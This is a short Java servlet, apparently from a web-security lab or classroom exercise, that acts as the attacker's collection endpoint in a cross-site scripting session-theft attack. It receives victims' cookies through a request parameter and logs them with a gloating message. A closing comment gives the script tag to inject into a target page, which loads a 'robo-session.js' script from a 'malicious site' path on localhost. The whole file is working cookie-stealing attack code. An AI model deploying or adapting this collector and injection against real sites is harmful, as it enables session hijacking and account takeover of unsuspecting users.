import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/robo-session")
public class RoboSessionServlet extends HttpServlet {
	
	public void doGet(HttpServletRequest req, HttpServletResponse resp) {
		String cookies = req.getParameter("cookies");
		System.out.println("!!!! Ha picado uno: " + cookies);
	}
}

//<script src="http://localhost:8080/sitio-maligno/robo-session.js"></script>